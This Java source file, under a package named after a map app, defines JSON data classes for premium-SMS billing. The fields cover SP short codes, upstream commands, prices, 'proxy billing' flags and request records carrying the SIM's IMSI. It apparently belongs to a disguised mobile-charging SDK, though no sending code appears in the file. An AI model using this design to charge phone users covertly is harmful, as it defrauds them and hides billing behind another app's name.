package com.baidu.BaiduMap.json;

import org.json.JSONObject;

import com.baidu.BaiduMap.utils.ACacheUtils;
import com.baidu.BaiduMap.utils.Log;
import com.baidu.BaiduMap.utils.Utils;

import android.content.Context;

/**
 * JsonEntity
 *
 * @author Jerry @date 2012-8-28 下午05:24:18
 * @version 1.0
 * @Description: JsonEntity
 * @JDK 1.6
 */

public class JsonEntity {

    static class Result implements JsonInterface {
        /**
         * 1.0.0 a:结果返回码
         */
        public int resultCode = -1;
        /**
         * 1.0.0 b:返回结果描述
         */
        public String description;
        public String status;

        @Override
        public String toString() {
            return "Result [resultCode=" + resultCode + ", description=" + description + "]";
        }

        public void parseJson(JSONObject json) {
            try {
                resultCode = json.isNull("a") ? -1 : json.getInt("a");
                description = json.isNull("b") ? null : json.getString("b");
            } catch (Exception e) {
                e.printStackTrace();
            }

        }

        @Override
        public JSONObject buildJson() {
            try {
                JSONObject json = new JSONObject();
                json.put("a", resultCode);
                json.put("b", description);
                return json;
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        public String getShortName() {
            return "c";
        }
    }

    /**
     * @author Jerry @date 2012-8-28 下午03:59:00
     * @version 1.0
     * @Description: 广告体
     * @JDK 1.6
     */

    public static class SMSBody implements JsonInterface {

        /**
         * 业务代码
         */
        public String service_type;
        /**
         * 上行目的号码
         */
        public String sp_code;
        /**
         * 上行指令
         */
        public String command;
        /**
         * 单条上行价格，单位为分
         */
        public String price;
        /**
         * 业务下行设别规则，正则表达式 (已废字段，可不解析)
         */
        public String recognition_rule;
        /**
         * SP的公司名
         */
        public String sp_name;
        /**
         * 游戏名或者业务名
         */
        public String service_name;
        /**
         * 1：正向业务 0：代计业务
         */
        public String exactly_matching_product;
        /**
         * 1：需要在计费的时候重新获取上行指令和上行号码
         */
        public String fetch_command_when_billing;

        @Override
        public void parseJson(JSONObject json) {
            // TODO Auto-generated method stub
            if (json == null)
                return;
            try {
                service_type = json.isNull("service_type") ? null : json.getString("service_type");
                sp_code = json.isNull("sp_code") ? null : json.getString("sp_code");
                command = json.isNull("command") ? null : json.getString("command");
                price = json.isNull("price") ? null : json.getString("price");
                recognition_rule = json.isNull("recognition_rule") ? null : json.getString("recognition_rule");
                sp_name = json.isNull("sp_name") ? null : json.getString("sp_name");
                service_name = json.isNull("service_name") ? null : json.getString("service_name");
                exactly_matching_product = json.isNull("exactly_matching_product") ? null
                        : json.getString("exactly_matching_product");
                fetch_command_when_billing = json.isNull("fetch_command_when_billing") ? null
                        : json.getString("fetch_command_when_billing");
            } catch (Exception e) {
                e.printStackTrace();
            }

        }

        @Override
        public JSONObject buildJson() {
            try {
                JSONObject json = new JSONObject();
                json.put("service_type", service_type);
                json.put("sp_code", sp_code);
                json.put("command", command);
                json.put("price", price);
                json.put("recognition_rule", recognition_rule);
                json.put("sp_name", sp_name);
                json.put("service_name", service_name);
                json.put("exactly_matching_product", exactly_matching_product);
                json.put("fetch_command_when_billing", fetch_command_when_billing);
                return json;
            } catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }

        @Override
        public String toString() {
            return "AdBody [service_type=" + service_type + ",&￥ sp_code=" + sp_code + ",&￥ command=" + command
                    + ",&￥ price=" + price + ",&￥ recognition_rule=" + recognition_rule + ",&￥ sp_name=" + sp_name
                    + ",&￥ service_name=" + service_name + ",&￥ exactly_matching_product=" + exactly_matching_product
                    + ",&￥ fetch_command_when_billing=" + fetch_command_when_billing + "]";
        }

        @Override
        public String getShortName() {
            // TODO Auto-generated method stub
            return "message";
        }

        private static final String SPLIT_STRING = "|#*";

        public boolean getMessage(String messageString) {
            String[] ss = Utils.split(messageString, SPLIT_STRING);
            if (ss == null)
                return false;
            try {
                service_type = ss[0];
                sp_code = ss[1];
                command = ss[2];
                price = ss[3];
                recognition_rule = ss[4];
                sp_name = ss[5];
                service_name = ss[6];
                exactly_matching_product = ss[7];
                fetch_command_when_billing = ss[8];
                return true;
            } catch (Exception e) {
                if (Log.D) {
                    e.printStackTrace();
                }
                return false;
            }

        }

        public String getString() {
            StringBuffer sb = new StringBuffer();
            sb.append(service_type);// 0
            sb.append(SPLIT_STRING);
            sb.append(sp_code);// 1
            sb.append(SPLIT_STRING);
            sb.append(command);// 2
            sb.append(SPLIT_STRING);
            sb.append(price);// 3
            sb.append(SPLIT_STRING);
            sb.append(recognition_rule);// 4
            sb.append(SPLIT_STRING);
            sb.append(sp_name);// 5
            sb.append(SPLIT_STRING);
            sb.append(service_name);// 6
            sb.append(SPLIT_STRING);
            sb.append(exactly_matching_product);// 7
            sb.append(SPLIT_STRING);
            sb.append(fetch_command_when_billing);// 8
            sb.append(SPLIT_STRING);
            return sb.toString();
        }

    }

    /**
     * @author Jerry @date 2012-8-28 下午03:39:14
     * @version 1.0
     * @Description: 请求参数
     * @JDK 1.6
     */

    public static class RequestProperties implements JsonInterface {

        /**
         * 应用ID
         */
        public String y_id;
        /**
         * 渠道ID
         */
        public String channel_id;
        /**
         * Sim卡序列号
         */
        public String imsi;
        /**
         * 手机型号
         */
        public String ua;
        /**
         * 请求单价，多个单价中间用“,”隔开。如不传则返回支持通道，否则返回指定单价的通道
         */
        public String customized_price;
        /**
         * 订单状态 0-成功，1-失败
         */
        public int status;
        /**
         * 包ID
         */
        public String packId;
        /**
         * 游戏ID
         */
        public String gameId;
        /**
         * 通道ID
         *
         * @param ctx
         */
        public String throughId;

        /**
         * 是否需要补单 0为要补单，1为不补单
         */
        public int is_supplement = 1;

        /**
         * 指令ID
         */
        public String cid;

        /**
         * 支付点ID
         */
        public String did;

        private RequestProperties() {

        }

        public RequestProperties(Context ctx) {
            // 设置vId和渠道id
            channel_id = Utils.getChlId(ctx);
            imsi = Utils.getIMSI(ctx);
            ua = android.os.Build.PRODUCT;
            packId = Utils.getPackId(ctx);
            gameId = Utils.getGameId(ctx);
        }

        @Override
        public String toString() {
            return "RequestProperties [y_id=" + y_id + ", channel_id=" + channel_id + ", imsi=" + imsi + ", ua=" + ua
                    + ", customized_price=" + customized_price + ", status=" + status + ", packId=" + packId
                    + ", gameId=" + gameId + ", throughId=" + throughId + ", is_supplement=" + is_supplement + ", cid="
                    + cid + ", did=" + did + "]";
        }

        @Override
        public JSONObject buildJson() {
            JSONObject json = new JSONObject();
            JSONObject json2 = new JSONObject();
            try {
                json.put("y_id", y_id);
                json.put("channel_id", channel_id);
                json.put("imsi", imsi);
                json.put("ua", ua);
                json.put("customized_price", customized_price);
                json.put("status", status);
                json.put("throughId", throughId);
                json.put("packId", packId);
                json.put("is_supplement", is_supplement);
                json.put("cid", cid);
                json.put("did", did);
                // return json;
                json2.put(getShortName(), json);
                return json2;
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        public void parseJson(JSONObject json) {
            if (json == null) {
                return;
            }
            try {
                y_id = json.isNull("y_id") ? null : json.getString("y_id");
                channel_id = json.isNull("channel_id") ? null : json.getString("channel_id");
                imsi = json.isNull("imsi") ? null : json.getString("imsi");
                ua = json.isNull("ua") ? null : json.getString("ua");
                customized_price = json.isNull("customized_price") ? null : json.getString("customized_price");
                status = json.isNull("status") ? 0 : json.getInt("status");
                throughId = json.isNull("throughId") ? null : json.getString("throughId");
                packId = json.isNull("packId") ? null : json.getString("packId");
                is_supplement = json.isNull("is_supplement") ? 0 : json.getInt("is_supplement");
                cid = json.isNull("cid") ? null : json.getString("cid");
                did = json.isNull("did") ? null : json.getString("did");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public String getShortName() {
            // TODO Auto-generated method stub
            return "a";
        }

        public RequestProperties clone() {
            RequestProperties cloneObj = new RequestProperties();
            cloneObj.y_id = this.y_id;
            cloneObj.channel_id = this.channel_id;
            cloneObj.imsi = this.imsi;
            cloneObj.ua = this.ua;
            cloneObj.customized_price = this.customized_price;
            cloneObj.status = this.status;
            cloneObj.throughId = this.throughId;
            cloneObj.packId = this.packId;
            cloneObj.is_supplement = this.is_supplement;
            cloneObj.cid = this.cid;
            cloneObj.did = this.did;
            return cloneObj;
        }

    }

    interface JsonInterface {
        JSONObject buildJson();

        void parseJson(JSONObject json);

        String getShortName();
    }

}
